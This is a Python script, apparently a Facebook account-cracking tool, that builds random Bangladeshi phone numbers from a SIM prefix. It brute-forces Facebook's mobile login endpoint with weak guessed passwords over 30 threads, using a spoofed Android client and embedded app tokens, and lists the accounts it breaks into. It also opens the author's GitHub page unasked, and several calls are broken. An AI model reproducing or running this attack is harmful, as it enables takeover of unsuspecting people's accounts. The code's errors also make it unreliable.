#-----------------[import]------------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=(f'''{B}
`7MM"""Mq. `7MMF' `7MN.   `7MF'  .g8"""bgd
{warna}  MM   `MM.  MM     MMN.    M  .dP'     `M
{B}  MM   ,M9   MM     M YMb   M  dM'       `
{warna}  MMmmdM9    MM     M  `MN. M  MM
 {B} MM         MM     M   `MM.M  MM.    `7MMF'
{warna}  MM         MM     M     YMM  `Mb.     MM
{B}.JMML.     .JMML. .JML.    YM    `"bmmmdPY
{warna}--------------------------------------------{B}
 Owner    : {C}AF-ARIYAN{B}
 Guthub   : AF-ARIYAN-404
 Facebook : ARIYAN CHOWDHURY
 Tools    : F{C}/{B}R{C}/{B}G{M} •{warna}[{H}TRAIL{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_DIPTO():
    clear()
    os.system('xdg-open https://github.com/ARIYAN-404')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')

def method_crack(ids,passlist):
		global oks
		global cps
		global loop
		try:
			for pas in passlist:
				sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
				sys.stdout.flash()
				adid = str(uuid.uuid4())
				device_id = str(uuid.uuid())
				data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": 'Dalvik/2.1.0 (Linux; U; Android 14; Redmi note 6 pro Build/TP1A.714293.067) [FBAN/EMA;FBAV/262.0.0.88.51;FBBV/872280642;FBRV/0;FBPN/com.facebook.lite;FBLC/as_IN;FBMF/Samsung;FBBD/Samsung;FBDV/Redmi note 6 pro;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
				url = 'https://b-graph.facebook.com/auth/login'
				po = requests.post(url,data=data,headers=headers).json()
				if 'session_key' in po:
					print('\r\r[MOMIN-OK] '+ids+' |  '+pas+'')
					break
					oks.append(ids)
				elif 'www.facebook.com' in po['error']['masege']:
					print('\r\r[MOMIN-CP] '+ids+' | '+pas+' ')
					break
				else:
					  continue
			loop+=1
		except:pass

	
MR_DIPTO()
     
